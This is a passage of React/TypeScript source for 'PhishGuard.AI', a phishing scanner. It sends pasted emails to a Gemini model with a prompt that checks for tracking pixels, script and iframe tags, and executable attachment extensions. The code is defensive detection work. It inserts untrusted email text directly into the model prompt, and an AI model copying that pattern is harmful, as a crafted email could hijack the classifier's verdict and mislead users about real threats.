          </p>
          <div style={styles.statBarContainer}>
            {topTargets.map((item, i) => (
              <div key={i} style={{ marginBottom: "0.5rem" }}>
                <div style={{ display: "flex", justifyContent: "space-between", fontSize: "0.8rem", marginBottom: "0.2rem", color: "#ccc" }}>
                  <span>{item.name}</span>
                  <span>{item.percent}%</span>
                </div>
                <div style={styles.statBar(item.percent, item.color)}>
                  <div style={styles.statBarFill(item.percent, item.color)}></div>
                </div>
              </div>
            ))}
          </div>
        </div>

        {/* Attack Vectors */}
        <div style={styles.card}>
          <h3 style={{ display: "flex", alignItems: "center", gap: "0.5rem" }}>
            <Icons.Zap /> COMMON ATTACK TRIGGERS
          </h3>
          <p style={{ color: "#888", fontSize: "0.9rem", marginBottom: "1.5rem" }}>
            The psychological levers used to make victims click.
          </p>
          
          <div style={{ display: "flex", flexWrap: "wrap", gap: "1rem" }}>
            {[
              { label: "URGENCY", size: "2rem", opacity: 1, color: "var(--accent-danger)" },
              { label: "CURIOSITY", size: "1.5rem", opacity: 0.8, color: "var(--accent-warning)" },
              { label: "FEAR", size: "1.8rem", opacity: 0.9, color: "var(--accent-danger)" },
              { label: "GREED", size: "1.2rem", opacity: 0.7, color: "#fff" },
              { label: "HELPFULNESS", size: "1.1rem", opacity: 0.6, color: "#fff" },
              { label: "AUTHORITY", size: "1.6rem", opacity: 0.85, color: "var(--accent-cyber)" }
            ].map((tag, i) => (
              <span key={i} style={{ 
                fontSize: tag.size, 
                opacity: tag.opacity, 
                color: tag.color, 
                fontWeight: "bold",
                border: "1px solid #333",
                padding: "0.5rem 1rem",
                borderRadius: "50px",
                background: "rgba(255,255,255,0.05)"
              }}>
                {tag.label}
              </span>
            ))}
          </div>

          <div style={{ marginTop: "2rem", background: "#111", padding: "1rem", borderRadius: "8px", borderLeft: "4px solid var(--accent-cyber)" }}>
             <strong style={{ color: "#fff" }}>DID YOU KNOW?</strong>
             <p style={{ color: "#aaa", fontSize: "0.9rem", marginTop: "0.5rem" }}>
               91% of all cyber attacks begin with a phishing email. The average employee receives 14 malicious emails per year.
             </p>
          </div>
        </div>

      </div>
    </div>
  );
};

// --- Component: App ---

function App() {
  const [activeTab, setActiveTab] = useState<"SCANNER" | "EDUCATION" | "STATS">("SCANNER");
  const [emailText, setEmailText] = useState("");
  const [loading, setLoading] = useState(false);
  const [result, setResult] = useState<AnalysisResult | null>(null);
  const [groundingSources, setGroundingSources] = useState<GroundingSource[]>([]);

  const loadSample = () => {
    setEmailText(SAMPLE_PHISHING_EMAIL);
    setResult(null);
    setGroundingSources([]);
  };

  const analyzeEmail = async () => {
    if (!emailText.trim()) return;

    setLoading(true);
    setResult(null);
    setGroundingSources([]);

    try {
      const ai = new GoogleGenAI({ apiKey: process.env.API_KEY || "" });
      
      const prompt = `
        You are a highly advanced cybersecurity defense system.
        
        TASK:
        1. Analyze the provided email text for phishing indicators, social engineering, and technical anomalies.
        2. SPECIFICALLY CHECK FOR PASSIVE THREATS:
           - Look for 'pixel trackers' (1x1 images from external domains).
           - Look for dangerous HTML tags like <script>, <iframe>, <object>, <embed>.
           - Look for suspicious attachment extensions in the text/headers (.exe, .scr, .vbs, .js).
        3. Use Google Search to VERIFY the sender domain reputation, check for known scams matching the subject line, and validate any claims.
        4. Determine a Verdict: SAFE, SUSPICIOUS, or MALICIOUS.
        
        EMAIL CONTENT:
        """
        ${emailText}
        """
        
        OUTPUT FORMAT:
        Return ONLY a raw JSON object with the following structure:
        {
          "verdict": "SAFE" | "SUSPICIOUS" | "MALICIOUS",
          "riskScore": number (0-100),
          "confidence": number (0-100),
          "summary": "Executive summary...",
          "technicalAnalysis": {
            "domainReputation": "Findings...",
            "authenticationChecks": "Checks..."
          },
          "passiveAnalysis": {
            "hasTrackingPixels": boolean,
            "hasDangerousAttachments": boolean,
            "hasScriptsOrIframes": boolean,
            "details": "Explanation of passive threats found..."
          },
          "socialEngineering": {
            "tacticsUsed": ["Urgency", "Scarcity", etc...],
            "urgencyLevel": "LOW" | "MEDIUM" | "HIGH"
          },
          "webIntelligence": "Search findings...",
          "recommendations": ["Action 1", "Action 2"]
        }
      `;

      const response = await ai.models.generateContent({
        model: "gemini-2.5-flash",
        contents: prompt,
        config: {
          tools: [{ googleSearch: {} }],
          temperature: 0.1, 
        }
      });

      const text = response.text || "";
      const cleanJson = text.replace(/```json\n?|\n?```/g, "").trim();
      let json: AnalysisResult;
      
      try {
        json = JSON.parse(cleanJson);
      } catch (e) {
        console.error("JSON Parse Error", e);
        json = {
          verdict: "SUSPICIOUS",
          riskScore: 50,
          confidence: 0,
          summary: "Error parsing model output. Raw text: " + text.substring(0, 100),
          technicalAnalysis: { domainReputation: "Unknown", authenticationChecks: "Unknown" },
          passiveAnalysis: { hasTrackingPixels: false, hasDangerousAttachments: false, hasScriptsOrIframes: false, details: "Analysis incomplete due to parsing error." },
          socialEngineering: { tacticsUsed: ["Error"], urgencyLevel: "MEDIUM" },
          webIntelligence: "Analysis failed to format correctly.",
          recommendations: ["Manually review email."]
        };
      }

      const chunks = response.candidates?.[0]?.groundingMetadata?.groundingChunks || [];
      const sources: GroundingSource[] = chunks
        .filter(c => c.web?.uri && c.web?.title)
        .map(c => ({ title: c.web!.title!, uri: c.web!.uri! }));

      setResult(json);
      setGroundingSources(sources);

    } catch (error) {
      console.error("Analysis failed", error);
      alert("System Error: Analysis protocols failed.");
    } finally {
      setLoading(false);
    }
  };

  return (
    <div style={styles.container}>
      {/* Header */}
      <header style={styles.header}>
        <div style={styles.title}>
          <div style={{ color: "var(--accent-cyber)" }}><Icons.ShieldCheck /></div>
          <span>PhishGuard<span style={{ color: "var(--accent-cyber)" }}>.AI</span></span>
        </div>
        <div style={{ fontSize: "0.8rem", color: "var(--text-secondary)", fontFamily: "monospace" }}>
          SYSTEM: ONLINE | v2.5
        </div>
      </header>

      {/* Navigation */}
      <nav style={styles.nav}>
        <button style={styles.navButton(activeTab === "SCANNER")} onClick={() => setActiveTab("SCANNER")}>
          <Icons.Search /> Active Scanner
        </button>
        <button style={styles.navButton(activeTab === "EDUCATION")} onClick={() => setActiveTab("EDUCATION")}>
          <Icons.BookOpen /> Threat Intel Academy
        </button>
        <button style={styles.navButton(activeTab === "STATS")} onClick={() => setActiveTab("STATS")}>
          <Icons.ChartBar /> Global Stats
        </button>
      </nav>

      {/* Main Content Area */}
      <main>
        {activeTab === "SCANNER" && (
          <ScannerView 
            emailText={emailText} 
            setEmailText={setEmailText} 
            loading={loading}
            analyzeEmail={analyzeEmail}
            loadSample={loadSample}
            result={result}
            groundingSources={groundingSources}
          />
        )}
        {activeTab === "EDUCATION" && <EducationView />}
        {activeTab === "STATS" && <StatsView />}
      </main>

    </div>
  );
}

const root = ReactDOM.createRoot(document.getElementById("root") as HTMLElement);
root.render(<App />);
